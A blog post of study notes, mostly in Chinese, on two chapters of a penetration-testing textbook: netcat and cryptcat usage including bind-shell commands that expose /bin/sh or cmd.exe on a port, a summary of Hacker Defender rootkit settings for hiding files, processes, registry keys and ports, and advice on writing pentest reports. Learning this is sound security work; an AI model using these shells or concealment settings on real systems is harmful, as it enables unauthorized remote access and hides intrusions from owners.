---
layout: post
title: The Basics of Hacking and Penetration Testing Part4
key: 20180406
category: books
tags:
  - 读书笔记
lang: zh
---
	
CHAPTER7 Post Exploitation and Maintaining Access with Backdoors, Rootkits, and Meterpreter
--------------------------------------

1、netcat

&ensp;&ensp;1、“聊天”

Server:  `nc –l –p 1337`

Client:   `nc 192.168.18.132 1337`

建立一个TCP连接

&ensp;&ensp;2、传输文件

server： `nc –l –p 7777 > virus.exe`

client：  `nc 172.16.45.129 7777 < virus.exe`

&ensp;&ensp;3、获取banner信息

`nc 192.168.18.132 50001`

输入一些内容，查看返回信息

&ensp;&ensp;4、正反向shell

Server：

`nc –l –p 12345 –e /bin/sh`

`nc.exe –L –p 12345 c:\Windows\System32\cmd.exe`

Client：

`nc 192.168.1.1 12345`

2、加密版的netcat：Cryptcat

1.	使用-k选项修改默认密钥
	
2.	Server：`cryptcat –l –p 5757`

3.	Client；`cryptcat 192.168.18.132 5757`

3、Rootkits - Hacker Defender

配置文件：

 <div align="center" markdown="1">
<img src="https://github.com/victor-infosec/victor-infosec.github.io/raw/master/_posts/books/The-Basics-of-Hacking-and-Penetration-Testing/8.png" alt="渗透测试流程8" height="50%" width="50%" />
</div>

**[Hidden Table]**. Any files, directories, or folders listed under this heading will be hidden from the explorer and file manager used by Windows.

**[Hidden Processes]** Each of the processes listed here will be hidden from the local user when they view currently running processes with the task manager.

**[Root Processes]** Any programs listed here will be allowed to view and interact with programs on the system, including those listed in the [Hidden Table] and [Hidden Processes] tab.

**[Hidden Services]** section will hide each of the listed services. Again, when interacting with the task manager, any program listed here will be concealed from the “services” list.

**[Hidden RegKeys]** section can be used to camouflage each of these keys. You will need to make sure that you list them all in order to avoid detection.

**[Hidden RegValues]** Entering information here will hide individual values rather than the entire key.

**[Startup Run]** is a list of programs that will be automatically run once Hacker Defender has been started.

You can use the **[Free Space]** section to force the computer to “add back” the amount of free space that you used.

If you know of ports that you plan to open, you can list them under the **[Hidden Ports]** section.

4、Meterpreter

常用命令

 <div align="center" markdown="1">
<img src="https://github.com/victor-infosec/victor-infosec.github.io/blob/master/_posts/books/The-Basics-of-Hacking-and-Penetration-Testing/9.png" alt="渗透测试流程9" height="80%" width="80%" />
</div>

CHAPTER 8 Wrapping Up the Penetration Test
--------------------------------------

1、Executive Summary

> - The executive summary should be a very brief overview of your major findings. 
> - If vulnerability and exploits were discovered, the executive summary needs to focus on explaining how these findings impact the business.

2、Detailed Report

> - This report will include a comprehensive list of your findings as well as the technical details.
> - Always present critical findings first.
> - The idea and use of proof-of-concept screenshots is a powerful tool and should be incorporated into the penetration testing report whenever possible. 
> - Whenever possible, when writing the penetration testing report, you need to include mitigations and suggestions for addressing the issues you discovered.

3、Raw Output

[optional]

4、note：

>If you have agreed to deliver the document electronically, you will need to ensure that the penetration testing report is encrypted and remains confidential until it arrives in the client’s hands.
